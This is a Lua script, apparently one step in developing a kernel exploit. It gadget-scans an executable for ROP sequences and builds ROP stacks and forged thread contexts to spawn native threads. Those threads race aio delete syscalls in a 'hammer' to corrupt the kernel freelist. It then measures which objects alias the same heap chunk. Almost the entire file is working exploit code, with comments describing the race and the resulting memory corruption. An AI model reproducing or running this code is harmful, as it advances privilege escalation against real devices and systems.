-- CRASH_CLASS: HIGH
-- PROBE 715a: quantify the chunk aliasing the delete hammer produces.
--
-- Context: 714a ran three native children looping aio delete while the parent
-- published a fresh id every 2 ms for 120 rounds. The parent never won a delete,
-- and afterwards deleting object A changed object B's poll state from 0x3 to
-- 0x00010003. Two objects cannot see each other unless their work items are the
-- same 0x58 chunk, which means the hammer left a duplicate on the freelist.
--
-- This probe repeats the hammer and then measures the aliasing directly:
--   - N objects are created and polled (all should read 0x3);
--   - they are deleted one at a time, and after each delete every survivor is
--     polled again;
--   - a survivor whose state changes when another object is deleted shares that
--     object's chunk.
--
-- The children are disarmed before the measurement by pointing the shared id
-- page at an id that does not exist, so a miss cannot disturb the survivors.

print("=== PROBE 715a: aio chunk alias matrix ===")
print("")

local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local function q(v) return string.format("0x%X", to_num(v)) end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function rq(a) local o,v=pcall(function() return memory.read_qword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end

local fn_ud = syscall.pipe.fn_addr
local fn = to_num(fn_ud)
print("[A] trampoline=" .. q(fn) .. " pid=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info+0x10C) or 0)*4294967296 + (rd(info+0x108) or 0)
local function find_pat(base, limit, pat)
    local chunk = 0x1000
    local off = 0
    while off < limit do
        local n = math.min(chunk, limit-off)
        local ok, s = pcall(function() return memory.read_buffer(base+off, n) end)
        if not ok or type(s) ~= "string" then break end
        local pos = string.find(s, pat, 1, true)
        if pos then return base+off+pos-1 end
        off = off + n - (#pat-1)
        if n < chunk then break end
    end
    return nil
end
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58,0xC3))
local pop_rsp = find_pat(ebase, 0x494000, string.char(0x5C,0xC3))
local jmp_g   = find_pat(ebase, 0x494000, string.char(0xEB,0xFE))
if not pop_rax or not pop_rsp or not jmp_g then print("[A] gadgets missing") return end

local sc_mmap = mk(477)
local page = 0x4000
local function mmap(px)
    local _, a = pcall(function() return sc_mmap(uint64(0), uint64(px), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
    local v = to_num(a)
    if v ~= 0 then zero(v, px) end
    return v
end

local C = {MAGIC=0x108, TYPE=0x110, CS=0x0C0, RIP=0x0E0, RSP=0x0F8, SS=0x100,
           RDI=0x048, RSI=0x050, RDX=0x058, RAX=0x078}
local id_page = mmap(page)
local KIDS = 3
local kids = 0
for k=1,KIDS do
    local stack = mmap(page*4)
    local base = stack + page*4 - 0x200
    wq(base,    uint64(pop_rax))
    wq(base+8,  uint64(662))
    wq(base+16, uint64(fn))
    wq(base+24, uint64(pop_rsp))
    wq(base+32, uint64(base))
    local stat = mmap(page)
    local ctx = memory.alloc(0x500)
    zero(ctx, 0x500)
    wq(ctx+C.MAGIC, uint64(0x480))
    wq(ctx+C.TYPE, uint64(0x10000))
    wq(ctx+C.CS, uint64(0x43))
    wq(ctx+C.SS, uint64(0x3B))
    wq(ctx+C.RIP, uint64(fn))
    wq(ctx+C.RSP, uint64(base))
    wq(ctx+C.RDI, uint64(id_page))
    wq(ctx+C.RSI, uint64(1))
    wq(ctx+C.RDX, uint64(stat))
    wq(ctx+C.RAX, uint64(662))
    local tb = memory.alloc(8)
    wq(tb, uint64(0))
    local ok = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
    if ok then kids = kids + 1 end
end
print(string.format("[A] eboot=%s children=%d", q(ebase), kids))
if kids == 0 then return end

-- [B] hammer: publish a fresh live id every round
local data = mmap(page)
local outid = mmap(page)
local pout = mmap(page)
local ts = memory.alloc(16)
wq(ts, 0); wq(ts+8, 1500000)
local ROUNDS = 150
local created = 0
for i=1,ROUNDS do
    local ok1, rv1 = pcall(function() return mk(669)(uint64(0x1), uint64(data), uint64(1), uint64(1), uint64(outid)) end)
    if ok1 and to_num(rv1) == 0 then
        created = created + 1
        wd(id_page, rd(outid) or 0)
        pcall(function() mk(240)(uint64(ts), uint64(0)) end)
    end
end
print(string.format("[B] hammer done rounds=%d created=%d", ROUNDS, created))

-- disarm: an id that cannot exist
wd(id_page, 0x7FFFFFFF)

-- [C] create N objects, then delete them one by one watching the survivors
local N = 10
local ids = {}
local polls = mmap(page)
local n_ok = 0
for i=1,N do
    local o = mmap(page)
    local ok, rv = pcall(function() return mk(669)(uint64(0x1), uint64(data), uint64(1), uint64(1), uint64(o)) end)
    local id = rd(o) or 0
    local st = "?"
    if ok and to_num(rv) == 0 then
        pcall(function() mk(664)(uint64(o), uint64(1), uint64(polls)) end)
        st = string.format("%08X", rd(polls) or 0)
        n_ok = n_ok + 1
    end
    ids[i] = { page = o, id = id, state = st }
end
local lines = {}
for i=1,N do line = nil
    local t = ids[i]
    table.insert(lines, string.format("%d:%X=%s", i, t.id, t.state))
end
print("[C] created " .. tostring(n_ok) .. "  " .. table.concat(lines, " "))

local flips = 0
for i=1,N do
    if ids[i].state ~= "?" then
        local s = mmap(page)
        wd(s, 0x77777777)
        pcall(function() mk(662)(uint64(ids[i].page), uint64(1), uint64(s)) end)
        local changed = {}
        for j=1,N do
            if j ~= i and ids[j].state ~= "?" then
                local pj = mmap(page)
                wd(pj, 0x77777777)
                local okp, rvp = pcall(function() return mk(664)(uint64(ids[j].page), uint64(1), uint64(pj)) end)
                local now = rd(pj) or 0
                if okp and to_num(rvp) == 0 then
                    local nst = string.format("%08X", now)
                    if nst ~= ids[j].state then
                        flips = flips + 1
                        table.insert(changed, string.format("%d:%s->%s", j, ids[j].state, nst))
                    end
                end
            end
        end
        if #changed > 0 then
            print(string.format("[D] after delete %d:", i) .. " " .. table.concat(changed, " "))
        end
    end
end
print(string.format("[E] survivor state changes=%d", flips))
print(string.format("[Z] alive=%d", to_num(native.fcall_with_rax(fn_ud, 20))))
